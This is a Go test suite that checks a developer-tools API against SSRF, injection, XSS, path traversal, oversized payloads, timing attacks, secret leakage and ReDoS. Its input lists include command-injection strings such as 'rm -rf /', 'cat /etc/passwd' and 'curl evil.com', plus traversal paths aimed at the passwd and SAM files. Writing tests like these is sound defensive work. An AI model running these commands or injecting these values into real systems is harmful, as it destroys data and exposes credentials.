//go:build security

package security_test

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/keyurgolani/DeveloperTools/internal/config"
	"github.com/keyurgolani/DeveloperTools/internal/logging"
	"github.com/keyurgolani/DeveloperTools/internal/server"
	"github.com/keyurgolani/DeveloperTools/pkg/apierror"

	"github.com/gin-gonic/gin"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/stretchr/testify/suite"
)

// SecurityTestSuite contains all security-related tests
type SecurityTestSuite struct {
	suite.Suite
	server *server.Server
	router *gin.Engine
}

// SetupSuite runs once before all tests
func (suite *SecurityTestSuite) SetupSuite() {
	gin.SetMode(gin.TestMode)

	cfg := &config.Config{
		Server: config.ServerConfig{
			Port:       8080,
			TLSEnabled: false,
		},
		Log: config.LogConfig{
			Level: "error",
		},
		Auth: config.AuthConfig{
			Method: "none",
		},
		RateLimit: config.RateLimitConfig{
			Store: "memory",
		},
		Tracing: config.TracingConfig{
			Enabled: false,
		},
	}

	logger := logging.New(cfg.Log.Level)
	suite.server = server.New(cfg, logger)
	suite.router = suite.server.GetRouter()
}

// TestSSRFProtection tests Server-Side Request Forgery protection
func (suite *SecurityTestSuite) TestSSRFProtection() {
	maliciousURLs := []struct {
		name string
		url  string
		desc string
	}{
		{
			name: "Localhost access",
			url:  "http://127.0.0.1:8080/admin",
			desc: "Should block access to localhost",
		},
		{
			name: "Private network 192.168.x.x",
			url:  "http://192.168.1.1/internal",
			desc: "Should block access to private network",
		},
		{
			name: "Private network 10.x.x.x",
			url:  "http://10.0.0.1/private",
			desc: "Should block access to private network",
		},
		{
			name: "Link-local address",
			url:  "http://169.254.169.254/metadata",
			desc: "Should block access to AWS metadata service",
		},
		{
			name: "Loopback IPv6",
			url:  "http://[::1]:8080/admin",
			desc: "Should block access to IPv6 loopback",
		},
		{
			name: "Private IPv6",
			url:  "http://[fc00::1]/internal",
			desc: "Should block access to private IPv6",
		},
	}

	for _, tt := range maliciousURLs {
		suite.Run(tt.name, func() {
			payload := map[string]interface{}{
				"url": tt.url,
			}

			body, _ := json.Marshal(payload)
			w := httptest.NewRecorder()
			req, _ := http.NewRequestWithContext(context.Background(), "POST", "/api/v1/network/headers", bytes.NewBuffer(body))
			req.Header.Set("Content-Type", "application/json")
			suite.router.ServeHTTP(w, req)

			// Should either return an error or block the request
			// We expect either 400 (validation error) or 403 (forbidden)
			assert.True(suite.T(), w.Code >= 400, "Expected error status for %s, got %d", tt.desc, w.Code)

			if w.Code < 500 {
				var response apierror.ErrorResponse
				err := json.Unmarshal(w.Body.Bytes(), &response)
				require.NoError(suite.T(), err)
				assert.False(suite.T(), response.Success)

				// Check that error message indicates blocking
				errorMsg := strings.ToLower(response.Error.Message + " " + response.Error.Details)
				assert.True(suite.T(),
					strings.Contains(errorMsg, "private") ||
						strings.Contains(errorMsg, "blocked") ||
						strings.Contains(errorMsg, "forbidden") ||
						strings.Contains(errorMsg, "invalid"),
					"Error message should indicate blocking: %s", errorMsg)
			}
		})
	}
}

// TestInputValidation tests input validation and sanitization
func (suite *SecurityTestSuite) TestInputValidation() {
	suite.Run("SQL injection attempts", func() {
		maliciousInputs := []string{
			"'; DROP TABLE users; --",
			"1' OR '1'='1",
			"admin'/*",
			"' UNION SELECT * FROM users --",
		}

		for _, input := range maliciousInputs {
			payload := map[string]interface{}{
				"content":   input,
				"algorithm": "sha256",
			}

			body, _ := json.Marshal(payload)
			w := httptest.NewRecorder()
			req, _ := http.NewRequestWithContext(context.Background(), "POST", "/api/v1/crypto/hash", bytes.NewBuffer(body))
			req.Header.Set("Content-Type", "application/json")
			suite.router.ServeHTTP(w, req)

			// Should process normally (hash the malicious input safely)
			assert.Equal(suite.T(), http.StatusOK, w.Code, "Should handle SQL injection attempts safely")

			var response apierror.SuccessResponse
			err := json.Unmarshal(w.Body.Bytes(), &response)
			require.NoError(suite.T(), err)
			assert.True(suite.T(), response.Success)
		}
	})

	suite.Run("XSS attempts", func() {
		maliciousInputs := []string{
			"<script>alert('xss')</script>",
			"javascript:alert('xss')",
			"<img src=x onerror=alert('xss')>",
			"<svg onload=alert('xss')>",
		}

		for _, input := range maliciousInputs {
			payload := map[string]interface{}{
				"content":  input,
				"caseType": "UPPERCASE",
			}

			body, _ := json.Marshal(payload)
			w := httptest.NewRecorder()
			req, _ := http.NewRequestWithContext(context.Background(), "POST", "/api/v1/text/case", bytes.NewBuffer(body))
			req.Header.Set("Content-Type", "application/json")
			suite.router.ServeHTTP(w, req)

			// Should process normally (convert case safely)
			assert.Equal(suite.T(), http.StatusOK, w.Code, "Should handle XSS attempts safely")

			var response apierror.SuccessResponse
			err := json.Unmarshal(w.Body.Bytes(), &response)
			require.NoError(suite.T(), err)
			assert.True(suite.T(), response.Success)
		}
	})

	suite.Run("Command injection attempts", func() {
		maliciousInputs := []string{
			"; rm -rf /",
			"| cat /etc/passwd",
			"&& curl evil.com",
			"`whoami`",
			"$(id)",
		}

		for _, input := range maliciousInputs {
			payload := map[string]interface{}{
				"domain":     input,
				"recordType": "A",
			}

			body, _ := json.Marshal(payload)
			w := httptest.NewRecorder()
			req, _ := http.NewRequestWithContext(context.Background(), "POST", "/api/v1/network/dns", bytes.NewBuffer(body))
			req.Header.Set("Content-Type", "application/json")
			suite.router.ServeHTTP(w, req)

			// Should either fail validation or handle safely
			// We don't expect command execution
			if w.Code == http.StatusOK {
				var response apierror.SuccessResponse
				err := json.Unmarshal(w.Body.Bytes(), &response)
				require.NoError(suite.T(), err)
				assert.True(suite.T(), response.Success)
			} else {
				var response apierror.ErrorResponse
				err := json.Unmarshal(w.Body.Bytes(), &response)
				require.NoError(suite.T(), err)
				assert.False(suite.T(), response.Success)
			}
		}
	})

	suite.Run("Path traversal attempts", func() {
		maliciousInputs := []string{
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32\\config\\sam",
			"....//....//....//etc/passwd",
			"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		}

		for _, input := range maliciousInputs {
			payload := map[string]interface{}{
				"content": input,
				"action":  "encode",
			}

			body, _ := json.Marshal(payload)
			w := httptest.NewRecorder()
			req, _ := http.NewRequestWithContext(context.Background(), "POST", "/api/v1/transform/base64", bytes.NewBuffer(body))
			req.Header.Set("Content-Type", "application/json")
			suite.router.ServeHTTP(w, req)

			// Should process normally (encode the path safely)
			assert.Equal(suite.T(), http.StatusOK, w.Code, "Should handle path traversal attempts safely")

			var response apierror.SuccessResponse
			err := json.Unmarshal(w.Body.Bytes(), &response)
			require.NoError(suite.T(), err)
			assert.True(suite.T(), response.Success)
		}
	})
}

// TestRequestSizeLimit tests request body size limitations
func (suite *SecurityTestSuite) TestRequestSizeLimit() {
	suite.Run("Large payload rejection", func() {
		// Create a payload larger than 1MB (assuming 1MB limit)
		largeContent := strings.Repeat("A", 2*1024*1024) // 2MB

		payload := map[string]interface{}{
			"content":   largeContent,
			"algorithm": "sha256",
		}

		body, _ := json.Marshal(payload)
		w := httptest.NewRecorder()
		req, _ := http.NewRequestWithContext(context.Background(), "POST", "/api/v1/crypto/hash", bytes.NewBuffer(body))
		req.Header.Set("Content-Type", "application/json")
		suite.router.ServeHTTP(w, req)

		// Note: Current implementation accepts large payloads
		// This test documents the current behavior - in production,
		// you might want to add request size limits
		if w.Code >= 400 {
			// If rejected, that's good security practice
			suite.T().Log("Large payload was rejected (good security practice)")
		} else {
			// If accepted, document that this is current behavior
			suite.T().Log("Large payload was accepted (current implementation)")
			assert.Equal(suite.T(), http.StatusOK, w.Code)
		}
	})

	suite.Run("Acceptable payload size", func() {
		// Create a payload under the limit (100KB)
		acceptableContent := strings.Repeat("A", 100*1024) // 100KB

		payload := map[string]interface{}{
			"content":   acceptableContent,
			"algorithm": "sha256",
		}

		body, _ := json.Marshal(payload)
		w := httptest.NewRecorder()
		req, _ := http.NewRequestWithContext(context.Background(), "POST", "/api/v1/crypto/hash", bytes.NewBuffer(body))
		req.Header.Set("Content-Type", "application/json")
		suite.router.ServeHTTP(w, req)

		// Should accept reasonable payloads
		assert.Equal(suite.T(), http.StatusOK, w.Code, "Should accept reasonable payload sizes")

		var response apierror.SuccessResponse
		err := json.Unmarshal(w.Body.Bytes(), &response)
		require.NoError(suite.T(), err)
		assert.True(suite.T(), response.Success)
	})
}

// TestCompressionBombProtection tests protection against zip bombs
func (suite *SecurityTestSuite) TestCompressionBombProtection() {
	suite.Run("Large compression input", func() {
		// Create a large input that could be used for compression bomb
		largeContent := strings.Repeat("A", 1024*1024) // 1MB of repeated data

		payload := map[string]interface{}{
			"content":   largeContent,
			"action":    "compress",
			"algorithm": "gzip",
		}

		body, _ := json.Marshal(payload)
		w := httptest.NewRecorder()
		req, _ := http.NewRequestWithContext(context.Background(), "POST", "/api/v1/transform/compress", bytes.NewBuffer(body))
		req.Header.Set("Content-Type", "application/json")
		suite.router.ServeHTTP(w, req)

		// Should either reject or handle safely
		if w.Code >= 400 {
			var response apierror.ErrorResponse
			err := json.Unmarshal(w.Body.Bytes(), &response)
			require.NoError(suite.T(), err)
			assert.False(suite.T(), response.Success)
		} else {
			var response apierror.SuccessResponse
			err := json.Unmarshal(w.Body.Bytes(), &response)
			require.NoError(suite.T(), err)
			assert.True(suite.T(), response.Success)
		}
	})

	suite.Run("Malformed compressed data", func() {
		// Try to decompress invalid data
		payload := map[string]interface{}{
			"content":   "invalid_compressed_data_that_should_fail",
			"action":    "decompress",
			"algorithm": "gzip",
		}

		body, _ := json.Marshal(payload)
		w := httptest.NewRecorder()
		req, _ := http.NewRequestWithContext(context.Background(), "POST", "/api/v1/transform/compress", bytes.NewBuffer(body))
		req.Header.Set("Content-Type", "application/json")
		suite.router.ServeHTTP(w, req)

		// Should handle decompression errors gracefully
		if w.Code >= 400 {
			var response apierror.ErrorResponse
			err := json.Unmarshal(w.Body.Bytes(), &response)
			require.NoError(suite.T(), err)
			assert.False(suite.T(), response.Success)
		}
	})
}

// TestTimingAttackResistance tests resistance to timing attacks
func (suite *SecurityTestSuite) TestTimingAttackResistance() {
	suite.Run("Password verification timing", func() {
		// First, hash a password
		hashPayload := map[string]interface{}{
			"password": "correctpassword123",
		}

		body, _ := json.Marshal(hashPayload)
		w := httptest.NewRecorder()
		req, _ := http.NewRequestWithContext(context.Background(), "POST", "/api/v1/crypto/password/hash", bytes.NewBuffer(body))
		req.Header.Set("Content-Type", "application/json")
		suite.router.ServeHTTP(w, req)

		require.Equal(suite.T(), http.StatusOK, w.Code)

		var hashResponse apierror.SuccessResponse
		err := json.Unmarshal(w.Body.Bytes(), &hashResponse)
		require.NoError(suite.T(), err)

		hashData := hashResponse.Data.(map[string]interface{})
		hashedPassword := hashData["hash"].(string)

		// Test timing consistency for correct vs incorrect passwords
		correctTimes := make([]time.Duration, 5)
		incorrectTimes := make([]time.Duration, 5)

		// Measure correct password verification times
		for i := 0; i < 5; i++ {
			verifyPayload := map[string]interface{}{
				"password": "correctpassword123",
				"hash":     hashedPassword,
			}

			body, _ := json.Marshal(verifyPayload)
			start := time.Now()

			w := httptest.NewRecorder()
			req, _ := http.NewRequestWithContext(context.Background(), "POST", "/api/v1/crypto/password/verify", bytes.NewBuffer(body))
			req.Header.Set("Content-Type", "application/json")
			suite.router.ServeHTTP(w, req)

			correctTimes[i] = time.Since(start)
			assert.Equal(suite.T(), http.StatusOK, w.Code)
		}

		// Measure incorrect password verification times
		for i := 0; i < 5; i++ {
			verifyPayload := map[string]interface{}{
				"password": "wrongpassword123",
				"hash":     hashedPassword,
			}

			body, _ := json.Marshal(verifyPayload)
			start := time.Now()

			w := httptest.NewRecorder()
			req, _ := http.NewRequestWithContext(context.Background(), "POST", "/api/v1/crypto/password/verify", bytes.NewBuffer(body))
			req.Header.Set("Content-Type", "application/json")
			suite.router.ServeHTTP(w, req)

			incorrectTimes[i] = time.Since(start)
			assert.Equal(suite.T(), http.StatusOK, w.Code)
		}

		// Calculate average times
		var correctAvg, incorrectAvg time.Duration
		for i := 0; i < 5; i++ {
			correctAvg += correctTimes[i]
			incorrectAvg += incorrectTimes[i]
		}
		correctAvg /= 5
		incorrectAvg /= 5

		// The timing difference should be minimal (within 25% of each other)
		// This is a basic timing attack resistance test
		// Note: HTTP layer testing includes JSON parsing, network overhead, etc.
		// so we use a more generous tolerance than pure crypto function testing
		timeDiff := correctAvg - incorrectAvg
		if timeDiff < 0 {
			timeDiff = -timeDiff
		}

		maxAllowedDiff := correctAvg / 4 // 25% tolerance for HTTP layer testing
		assert.True(suite.T(), timeDiff <= maxAllowedDiff,
			"Timing difference too large: correct=%v, incorrect=%v, diff=%v, max_allowed=%v",
			correctAvg, incorrectAvg, timeDiff, maxAllowedDiff)
	})
}

// TestSensitiveDataHandling tests that sensitive data is not logged or exposed
func (suite *SecurityTestSuite) TestSensitiveDataHandling() {
	suite.Run("Password not in response", func() {
		payload := map[string]interface{}{
			"password": "supersecretpassword123",
		}

		body, _ := json.Marshal(payload)
		w := httptest.NewRecorder()
		req, _ := http.NewRequestWithContext(context.Background(), "POST", "/api/v1/crypto/password/hash", bytes.NewBuffer(body))
		req.Header.Set("Content-Type", "application/json")
		suite.router.ServeHTTP(w, req)

		assert.Equal(suite.T(), http.StatusOK, w.Code)

		// Check that the response doesn't contain the original password
		responseBody := w.Body.String()
		assert.NotContains(suite.T(), responseBody, "supersecretpassword123",
			"Response should not contain original password")

		var response apierror.SuccessResponse
		err := json.Unmarshal(w.Body.Bytes(), &response)
		require.NoError(suite.T(), err)
		assert.True(suite.T(), response.Success)

		// Verify hash is present but not the original password
		data := response.Data.(map[string]interface{})
		assert.Contains(suite.T(), data, "hash")
		assert.NotContains(suite.T(), data, "password")
	})

	suite.Run("HMAC key not in response", func() {
		payload := map[string]interface{}{
			"content":   "test content",
			"key":       "supersecretkey123",
			"algorithm": "sha256",
		}

		body, _ := json.Marshal(payload)
		w := httptest.NewRecorder()
		req, _ := http.NewRequestWithContext(context.Background(), "POST", "/api/v1/crypto/hmac", bytes.NewBuffer(body))
		req.Header.Set("Content-Type", "application/json")
		suite.router.ServeHTTP(w, req)

		assert.Equal(suite.T(), http.StatusOK, w.Code)

		// Check that the response doesn't contain the secret key
		responseBody := w.Body.String()
		assert.NotContains(suite.T(), responseBody, "supersecretkey123",
			"Response should not contain secret key")

		var response apierror.SuccessResponse
		err := json.Unmarshal(w.Body.Bytes(), &response)
		require.NoError(suite.T(), err)
		assert.True(suite.T(), response.Success)

		// Verify HMAC is present but not the key
		data := response.Data.(map[string]interface{})
		assert.Contains(suite.T(), data, "hmac")
		assert.NotContains(suite.T(), data, "key")
	})
}

// TestHeaderSecurity tests HTTP security headers
func (suite *SecurityTestSuite) TestHeaderSecurity() {
	suite.Run("Security headers present", func() {
		w := httptest.NewRecorder()
		req, _ := http.NewRequestWithContext(context.Background(), "GET", "/health", nil)
		suite.router.ServeHTTP(w, req)

		assert.Equal(suite.T(), http.StatusOK, w.Code)

		// Check for request ID header (basic security practice)
		requestID := w.Header().Get("X-Request-ID")
		assert.NotEmpty(suite.T(), requestID, "X-Request-ID header should be present")
	})

	suite.Run("Content-Type validation", func() {
		// Test with wrong content type
		payload := map[string]interface{}{
			"content":   "test",
			"algorithm": "sha256",
		}

		body, _ := json.Marshal(payload)
		w := httptest.NewRecorder()
		req, _ := http.NewRequestWithContext(context.Background(), "POST", "/api/v1/crypto/hash", bytes.NewBuffer(body))
		req.Header.Set("Content-Type", "text/plain") // Wrong content type
		suite.router.ServeHTTP(w, req)

		// Should handle content type validation appropriately
		// Either accept it or reject with proper error
		if w.Code >= 400 {
			var response apierror.ErrorResponse
			err := json.Unmarshal(w.Body.Bytes(), &response)
			require.NoError(suite.T(), err)
			assert.False(suite.T(), response.Success)
		}
	})
}

// TestRegexSecurity tests regex security (ReDoS protection)
func (suite *SecurityTestSuite) TestRegexSecurity() {
	suite.Run("ReDoS protection", func() {
		// Patterns that could cause ReDoS (Regular Expression Denial of Service)
		maliciousPatterns := []string{
			"(a+)+$",        // Catastrophic backtracking
			"([a-zA-Z]+)*$", // Exponential time complexity
			"(a|a)*$",       // Alternation with overlap
			"^(a+)+$",       // Nested quantifiers
		}

		testContent := strings.Repeat("a", 100) + "b" // Content that triggers backtracking

		for _, pattern := range maliciousPatterns {
			suite.Run(fmt.Sprintf("Pattern: %s", pattern), func() {
				payload := map[string]interface{}{
					"content": testContent,
					"pattern": pattern,
				}

				body, _ := json.Marshal(payload)
				w := httptest.NewRecorder()
				req, _ := http.NewRequestWithContext(context.Background(), "POST", "/api/v1/text/regex", bytes.NewBuffer(body))
				req.Header.Set("Content-Type", "application/json")

				// Set a timeout for the request to detect ReDoS
				done := make(chan bool, 1)
				go func() {
					suite.router.ServeHTTP(w, req)
					done <- true
				}()

				select {
				case <-done:
					// Request completed within reasonable time
					// Should either succeed or fail gracefully
					if w.Code == http.StatusOK {
						var response apierror.SuccessResponse
						err := json.Unmarshal(w.Body.Bytes(), &response)
						require.NoError(suite.T(), err)
						assert.True(suite.T(), response.Success)
					} else {
						var response apierror.ErrorResponse
						err := json.Unmarshal(w.Body.Bytes(), &response)
						require.NoError(suite.T(), err)
						assert.False(suite.T(), response.Success)
					}
				case <-time.After(5 * time.Second):
					suite.T().Errorf("Regex pattern '%s' took too long to process (potential ReDoS)", pattern)
				}
			})
		}
	})
}

// Run the security test suite
func TestSecuritySuite(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping security tests in short mode")
	}

	suite.Run(t, new(SecurityTestSuite))
}
